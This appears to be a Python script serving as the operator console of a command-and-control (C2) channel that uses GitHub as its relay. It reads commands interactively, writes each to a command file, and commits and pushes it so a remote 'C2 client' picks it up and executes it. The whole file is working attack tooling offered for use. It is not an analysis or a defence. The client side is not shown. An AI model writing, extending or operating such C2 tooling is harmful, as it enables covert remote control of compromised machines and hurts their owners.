import os
import subprocess
# Adjust as required as im using a windows system with wsl
COMMAND_FILE = r"C:\Users\User\Downloads\C2test\command.txt" # path
GIT_DIR = "/mnt/c/Users/User/Downloads/C2test" # path
COMMAND_FILE_WSL = "/mnt/c/Users/User/Downloads/C2test/command.txt" # path 

def update_command(command):
    with open(COMMAND_FILE, "w") as file:
        file.write(command + "\n")
    print(f"[+] Updated command: {command}")
    try:
        subprocess.run(["wsl", "git", "-C", GIT_DIR, "add", COMMAND_FILE_WSL], check=True)
        subprocess.run(["wsl", "git", "-C", GIT_DIR, "commit", "-m", "Updated command"], check=True)
        subprocess.run(["wsl", "git", "-C", GIT_DIR, "push"], check=True)
        print("[+] Command pushed to GitHub successfully!")
    except subprocess.CalledProcessError as e:
        print(f"[!] Git push failed: {e}")

def main():
    while True:
        command = input("Enter command to execute on C2 client: ")
        update_command(command)
        print("[+] Command updated. Waiting for execution...")

if __name__ == "__main__":
    main()
